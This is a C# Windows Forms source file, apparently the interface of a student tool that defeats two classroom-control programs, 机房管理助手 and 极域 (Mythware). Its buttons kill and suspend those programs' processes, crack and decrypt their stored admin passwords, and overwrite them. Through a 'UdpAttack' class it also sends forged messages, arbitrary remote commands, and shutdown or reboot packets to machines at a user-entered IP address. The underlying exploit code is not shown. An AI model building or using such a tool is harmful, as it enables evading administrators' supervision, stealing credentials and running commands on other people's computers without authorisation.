using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DemoGUI
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void ShowError(string message)
        {
            MessageBox.Show(message, "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }

        private void ShowInfo(string message)
        {
            MessageBox.Show(message, "提示", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void buttonKillJF_Click(object sender, EventArgs e)
        {
            try
            {
                T4CLLibrary.Jfglzs.ProcessKiller.KillAllProcesses();
                ShowInfo("机房管理助手进程已结束");
            }
            catch (Exception ex)
            {
                ShowError(ex.Message);
            }
        }

        private void buttonKillJY_Click(object sender, EventArgs e)
        {
            try
            {
                T4CLLibrary.Mythware.ProcessManager.KillAllProcesses();
                ShowInfo("极域进程已结束");
            }
            catch (Exception ex)
            {
                ShowError(ex.Message);
            }
        }

        private void buttonSuspendJY_Click(object sender, EventArgs e)
        {
            try
            {
                T4CLLibrary.Mythware.ProcessManager.SuspendMainProcess();
                ShowInfo("极域主进程已挂起");
            }
            catch (Exception ex)
            {
                ShowError(ex.Message);
            }
        }

        private void buttonResumeJY_Click(object sender, EventArgs e)
        {
            try
            {
                T4CLLibrary.Mythware.ProcessManager.ResumeMainProcess();
                ShowInfo("极域主进程已恢复");
            }
            catch (Exception ex)
            { 
                ShowError(ex.Message);
            }
        }

        private void buttonTmpPwd_Click(object sender, EventArgs e)
        {
            var pwd = T4CLLibrary.Jfglzs.PasswordCracker.GenerateTemporaryPassword();
            ShowInfo($"生成的临时密码为：{pwd}, 已复制到剪切板");
            Clipboard.SetText(pwd);
        }

        private void checkBoxNew_CheckedChanged(object sender, EventArgs e)
        {
            buttonGetJFPwd.Enabled = checkBoxNew.Checked;
        }

        private void buttonJFPwd_Click(object sender, EventArgs e)
        {
            try
            {
                var pwd = textBoxPwd.Text;
                if (string.IsNullOrEmpty(pwd))
                {
                    ShowError("请输入密码");
                    return;
                }
                var isNew = checkBoxNew.Checked;
                if (isNew)
                {
                    var encryptedPwd = T4CLLibrary.Jfglzs.PasswordCracker.EncryptPasswordNew(pwd);
                    T4CLLibrary.Jfglzs.PasswordCracker.SetEncryptedPassword(encryptedPwd);
                }
                else
                {
                    var encryptedPwd = T4CLLibrary.Jfglzs.PasswordCracker.EncryptPassword(pwd);
                    T4CLLibrary.Jfglzs.PasswordCracker.SetEncryptedPassword(pwd);
                }
                ShowInfo("密码已设置");
            }
            catch (Exception ex)
            {
                ShowError(ex.Message);
            }
        }

        private void buttonJYPwd_Click(object sender, EventArgs e)
        {
            try
            {
                var pwd = textBoxPwd.Text;
                if (string.IsNullOrEmpty(pwd))
                {
                    ShowError("请输入密码");
                    return;
                }
                var encryptedPwd = T4CLLibrary.Mythware.PasswordCracker.EncryptPassword(pwd);
                T4CLLibrary.Mythware.PasswordCracker.SetEncryptedPassword(encryptedPwd);
                ShowInfo("密码已设置");
            }
            catch (UnauthorizedAccessException)
            {
                ShowError("访问被拒绝，请以管理员身份运行本程序");
            }
            catch (Exception ex)
            {
                ShowError(ex.Message);
            }
        }

        private async void buttonGetJFPwd_Click(object sender, EventArgs e)
        {
            try
            {
                labelJFPwdCrackState.Text = "正在获取密码...";
                var encryptedPwd = T4CLLibrary.Jfglzs.PasswordCracker.GetEncryptedPassword();
                List<string> decryptedPwd = new List<string>();
                await Task.Run(() => {
                    decryptedPwd = T4CLLibrary.Jfglzs.PasswordCracker.DecryptPassword(encryptedPwd).ToList(); 
                });
                if (decryptedPwd.Count == 0)
                {
                    ShowError("获取密码失败");
                }
                else
                {
                    ShowInfo($"获取密码成功: {string.Join(",", decryptedPwd)}");
                }
            }
            catch (Exception ex)
            {
                ShowError($"获取密码失败{ex.Message}");
            }
            finally
            {
                labelJFPwdCrackState.Text = "";
            }
        }

        private void buttonGetJYPwd_Click(object sender, EventArgs e)
        {
            try
            {
                var encryptedPwd = T4CLLibrary.Mythware.PasswordCracker.GetEncryptedPassword();
                var decryptedPwd = T4CLLibrary.Mythware.PasswordCracker.DecryptPassword(encryptedPwd);
                ShowInfo($"获取密码成功: {decryptedPwd}");
            }
            catch (Exception ex)
            {
                ShowError($"获取密码失败{ex.Message}");
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            labelJFPwdCrackState.Text = "";
        }

        private void buttonSuspend_Click(object sender, EventArgs e)
        {
            var processName = textBoxProcName.Text;
            if (string.IsNullOrEmpty(processName))
            {
                ShowError("请输入进程名");
                return;
            }
            try
            {
                T4CLLibrary.ProcessHelper.SuspendProcessByName(processName);
                ShowInfo($"进程 {processName} 已挂起");
            }
            catch (Exception ex)
            {
                ShowError($"挂起进程失败: {ex.Message}");
            }
        }

        private void buttonResume_Click(object sender, EventArgs e)
        {
            var processName = textBoxProcName.Text;
            if (string.IsNullOrEmpty(processName))
            {
                ShowError("请输入进程名");
                return;
            }
            try
            {
                T4CLLibrary.ProcessHelper.ResumeProcessByName(processName);
                ShowInfo($"进程 {processName} 已恢复");
            }
            catch (Exception ex)
            {
                ShowError($"恢复进程失败: {ex.Message}");
            }
        }

        private void buttonKill_Click(object sender, EventArgs e)
        {
            var processName = textBoxProcName.Text;
            if (string.IsNullOrEmpty(processName))
            {
                ShowError("请输入进程名");
                return;
            }
            try
            {
                T4CLLibrary.ProcessHelper.KillProcessByName(processName);
                ShowInfo($"进程 {processName} 已结束");
            }
            catch (Exception ex)
            {
                ShowError($"结束进程失败: {ex.Message}");
            }
        }

        private void buttonSendMsg_Click(object sender, EventArgs e)
        {
            try
            {
                var msg = textBoxSendText.Text;
                T4CLLibrary.Mythware.UdpAttack.SendMessage(msg, T4CLLibrary.Mythware.CommandType.SendMessage, textBoxIP.Text, int.Parse(textBoxPort.Text));
                ShowInfo($"发送消息: {msg} 到 {textBoxIP.Text}:{textBoxPort.Text}");
            }
            catch (Exception ex)
            {
                ShowError($"发送消息失败: {ex.Message}");
            }
        }

        private void buttonSendCmd_Click(object sender, EventArgs e)
        {
            try
            {
                var cmd = textBoxSendText.Text;
                T4CLLibrary.Mythware.UdpAttack.SendMessage(cmd, T4CLLibrary.Mythware.CommandType.ExecuteCommand, textBoxIP.Text, int.Parse(textBoxPort.Text));
                ShowInfo($"发送命令: {cmd} 到 {textBoxIP.Text}:{textBoxPort.Text}");
            }
            catch (Exception ex)
            {
                ShowError($"发送命令失败: {ex.Message}");
            }
        }

        private void buttonSendShutdown_Click(object sender, EventArgs e)
        {
            try
            {
                T4CLLibrary.Mythware.UdpAttack.SendMessage(null, T4CLLibrary.Mythware.CommandType.Shutdown, textBoxIP.Text, int.Parse(textBoxPort.Text));
                ShowInfo($"发送关机命令到 {textBoxIP.Text}:{textBoxPort.Text}");
            }
            catch (Exception ex)
            {
                ShowError($"发送关机命令失败: {ex.Message}");
            }
        }

        private void buttonSendReboot_Click(object sender, EventArgs e)
        {
            try
            {
                T4CLLibrary.Mythware.UdpAttack.SendMessage(null, T4CLLibrary.Mythware.CommandType.Reboot, textBoxIP.Text, int.Parse(textBoxPort.Text));
                ShowInfo($"发送重启命令到 {textBoxIP.Text}:{textBoxPort.Text}");
            }
            catch (Exception ex)
            {
                ShowError($"发送重启命令失败: {ex.Message}");
            }
        }

        private void buttonGetPort_Click(object sender, EventArgs e)
        {
            try
            {
                var result = T4CLLibrary.Mythware.UdpAttack.GetMythwareListeningPorts();
                if (result == null || result.Count() == 0)
                {
                    ShowError("获取端口失败");
                    return;
                }
                var ports = string.Join(", ", result);
                ShowInfo($"获取端口成功: {ports}");
            }
            catch (Exception ex)
            {
                ShowError($"获取端口失败: {ex.Message}");
            }
        }
    }
}
